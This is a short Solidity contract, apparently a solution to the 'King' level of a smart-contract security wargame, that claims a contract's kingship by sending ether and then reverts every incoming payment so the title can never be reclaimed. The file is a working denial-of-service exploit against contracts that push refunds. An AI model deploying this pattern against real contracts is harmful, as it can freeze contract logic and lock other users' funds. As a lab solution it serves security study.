// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// KingAttack default function should immediately send back ether to target contract

contract KingAttack {
    // use this to become the KING of the contract
    function forwardFunds(address _kingTarget) external payable {
        (bool success, ) = _kingTarget.call{value: msg.value}("");
        require(success, "SEND FAILED");
    }

    // When you submit the instance back to the level, the level is going to reclaim kingship.
    // it will call King.receive() which will first send back all ether to the king contract. When it does,
    // reject it so the claim to the throne is not completed.
    receive() external payable {
        revert("I'M STAYING THE KING");
    }
}
